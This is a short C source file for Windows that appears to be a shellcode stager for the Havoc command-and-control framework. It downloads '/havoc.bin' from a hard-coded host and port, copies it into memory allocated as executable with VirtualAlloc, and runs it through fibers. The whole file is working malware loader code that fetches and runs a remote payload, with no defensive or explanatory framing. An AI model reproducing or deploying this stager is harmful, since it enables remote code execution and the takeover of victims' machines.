#include <windows.h>
#include <common.h>
#include <core/win32.h>
#include <core/fibers.h>
#include <core/transport.h>

void Main(){

    INSTANCE Instance = { 0 };
    InitInstance(&Instance);

    WCHAR Host[] = L"192.168.0.101";
    int   Port   = 7777;
    WCHAR Path[] = L"/havoc.bin";

	DWORD Bs;
	PBYTE Bt;
    StagerReceive( Instance, Host, Port, Path, &Bt, &Bs );

	PVOID Addr = Instance.Api.pVirtualAlloc(NULL, Bs, 0x3000, 0x40);
	MemCopy(Addr, Bt, Bs);

    ExecViaFibers( Instance, Addr );

}

